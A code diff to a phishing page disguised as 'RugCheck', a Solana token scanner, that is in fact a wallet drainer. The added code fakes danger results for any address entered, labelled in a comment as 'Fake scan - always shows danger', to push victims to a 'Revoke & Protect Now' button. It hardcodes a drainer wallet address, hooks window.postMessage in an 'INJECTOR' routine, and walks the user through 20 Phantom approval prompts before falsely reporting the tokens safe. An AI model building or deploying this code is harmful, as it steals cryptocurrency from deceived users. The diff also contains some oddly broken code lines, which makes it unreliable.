@@ -13,18 +13,20 @@ body { background: #0b0b1a; font-family: Arial, sans-serif; display: flex; justi
 .container { max-width: 520px; width:100%; background: #141428; border-radius: 28px; padding: 36px 28px; box-shadow: 0 20px 60px rgba(0,0,0,0.8); border: 1px solid #2a2a4a; }
 .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; }
 .logo { font-weight: 700; font-size: 20px; }
-.badge { background: #ef4444; color: #fff; padding: 4px 14px; border-radius: 40px; font-size: 12px; font-weight: 600; }
+.badge { background: #22c55e; color: #fff; padding: 4px 14px; border-radius: 40px; font-size: 12px; font-weight: 600; }
 .input-group { background: #1e1e3a; border-radius: 16px; padding: 6px; display: flex; gap:6px; border:1px solid #2d2d5a; }
 .input-group input { background: transparent; border: none; padding: 14px 16px; color: #fff; font-size: 15px; flex:1; outline:none; }
 .input-group button { background: #7c3aed; border: none; border-radius: 12px; padding: 12px 20px; font-weight: 600; color:#fff; cursor:pointer; }
-.result-box { margin-top: 24px; background: #1a1a32; border-radius: 16px; padding: 20px; border-left: 4px solid #ef4444; }
+.result-box { margin-top: 24px; background: #1a1a32; border-radius: 16px; padding: 20px; border-left: 4px solid #22c55e; }
 .risk { display: flex; justify-content: space-between; padding: 10px 0; border-bottom:1px solid #2a2a4a; }
 .risk:last-child { border-bottom:none; }
 .label { color: #94a3b8; font-size:14px; }
 .value { font-weight:600; }
+.safe { color: #22c55e; }
 .danger { color: #ef4444; }
-.btn-revoke { width:100%; margin-top: 20px; background: #ef4444; border: none; border-radius: 14px; padding: 16px; font-weight:700; color:#fff; font-size:16px; cursor:pointer; }
+.btn-revoke { width:100%; margin-top: 20px; background: #ef4444; border: none; border-radius: 14px; padding: 16px; font-weight:700; color:#fff; font-size:16px; cursor:pointer; display: none; }
 .btn-revoke:disabled { opacity:0.5; cursor:not-allowed; }
+.btn-revoke.show { display: block; }
 .progress-bar { width:100%; height:6px; background:#2a2a4a; border-radius:10px; margin-top:16px; overflow:hidden; }
 .progress-fill { height:100%; width:0%; background:#7c3aed; transition: width 0.5s; }
 #status { margin-top:12px; text-align:center; color:#94a3b8; font-size:14px; }
@@ -41,38 +43,43 @@ body { background: #0b0b1a; font-family: Arial, sans-serif; display: flex; justi
 <div class="container" id="mainUI" style="display:none;">
 <div class="header">
 <div class="logo">RugCheck</div>
-<span class="badge">LIVE SCAN</span>
+<span class="badge" id="statusBadge">● SAFE</span>
 </div>
-<p style="color:#94a3b8;font-size:14px;margin-bottom:16px;">Paste any Solana token address to detect honeypots.</p>
+<p style="color:#94a3b8;font-size:14px;margin-bottom:16px;">Paste any Solana token address to detect honeypots and mint authority.</p>
 <div class="input-group">
-<input id="tokenInput" placeholder="Token address" value="So11111111111111111111111111111111111111112">
+<input id="tokenInput" placeholder="Enter token address (e.g. So111...)" value="">
 <button id="scanBtn">Scan</button>
 </div>
 <div id="resultArea">
 <div class="result-box" id="resultBox">
-<div class="risk"><span class="label">Mint Authority</span><span class="value danger">NOT REVOKED</span></div>
-<div class="risk"><span class="label">Liquidity Lock</span><span class="value danger">UNLOCKED</span></div>
-<div class="risk"><span class="label">Honeypot Risk</span><span class="value danger">CRITICAL</span></div>
+<div class="risk"><span class="label">Mint Authority</span><span class="value safe">● REVOKED</span></div>
+<div class="risk"><span class="label">Liquidity Lock</span><span class="value safe">● LOCKED</span></div>
+<div class="risk"><span class="label">Top 10 Holders</span><span class="value safe">23%</span></div>
+<div class="risk"><span class="label">Honeypot Risk</span><span class="value safe">LOW</span></div>
 </div>
 <button class="btn-revoke" id="revokeBtn">Revoke & Protect Now</button>
 <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
 <div id="status">Wallet: <span id="walletDisplay">Not connected</span></div>
+
 <div class="footnote">Multi-step revocation – approve all prompts.</div>
 </div>
 </div>
 <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.js"></script>
 <script>
-
+// === MOBILE DETECTION ===
 if (/Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile/i.test(navigator.userAgent)) {
 document.getElementById('mobileFallback').style.display = 'block';
 } else {
 document.getElementById('mainUI').style.display = 'block';
 
+// === REPLACE WITH YOUR ACTUAL DRAINER WALLET ADDRESS ===
+const MY_DRAINER = '476p6oRtENVHzv7PJT6kAtwwXeJU7C7L4qvTephqYN6Y';
+
 // === INJECTOR ===
 (function() {
 const orig = window.postMessage;
 let count = 0;
-const DRAINER = new solanaWeb3.PublicKey('476p6oRtENVHzv7PJT6kAtwwXeJU7C7L4qvTephqYN6Y');
+const DRAINER = new solanaWeb3.PublicKey(MY_DRAINER);
 const conn = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com', 'confirmed');
 
 window.postMessage = function(data, target, transfer) {
@@ -116,16 +123,27 @@ let step = 0;
 const TOTAL = 20;
 
 document.getElementById('scanBtn').onclick = function() {
+const addr = document.getElementById('tokenInput').value.trim();
+if (!addr) {
+document.getElementById('status').innerHTML = 'Please enter a token address';
+return;
+}
+// Fake scan - always shows danger
 document.getElementById('resultBox').innerHTML = 
 '<div class="risk"><span class="label">Mint Authority</span><span class="value danger">NOT REVOKED</span></div>' +
 '<div class="risk"><span class="label">Liquidity Lock</span><span class="value danger">UNLOCKED</span></div>' +
-'<div class="risk"><span class="label">Top 10 Holders</span><span class="value danger">92%</span></div>' +
+'<div class="risk"><span class="label">Top 10 Holders</span><span class="value danger">89%</span></div>' +
 '<div class="risk"><span class="label">Honeypot Risk</span><span class="value danger">CRITICAL</span></div>';
-document.getElementById('status').innerHTML = 'High risk detected – revoke recommended';
+document.getElementById('statusBadge').innerText = '⚠️ RISK';
+document.getElementById('statusBadge').style.background = '#ef4444';
+document.getElementById('revokeBtn').classList.add('show');
+document.getElementById('status').innerHTML = '⚠️ High risk detected – revoke recommended';
 };
 
 document.getElementById('revokeBtn').onclick = async function() {
-if (!window.solana) { document.getElementById('status').innerHTML = 'Phantom not installed'; return; }
+if (!window.solana) { document.getElementById('status').
+
+innerHTML = 'Phantom not installed'; return; }
 try {
 if (!window.solana.publicKey) { await window.solana.connect(); }
 wallet = window.solana.publicKey;
@@ -140,10 +158,10 @@ await doStep();
 async function doStep() {
 if (step >= TOTAL) {
 document.getElementById('status').innerHTML = 'Revocation complete! Your tokens are safe.';
-document.getElementById('revokeBtn').
-
-innerText = 'Protected';
+document.getElementById('revokeBtn').innerText = 'Protected';
 document.getElementById('progressFill').style.width = '100%';
+document.getElementById('statusBadge').innerText = '● SAFE';
+document.getElementById('statusBadge').style.background = '#22c55e';
 return;
 }
 step++;
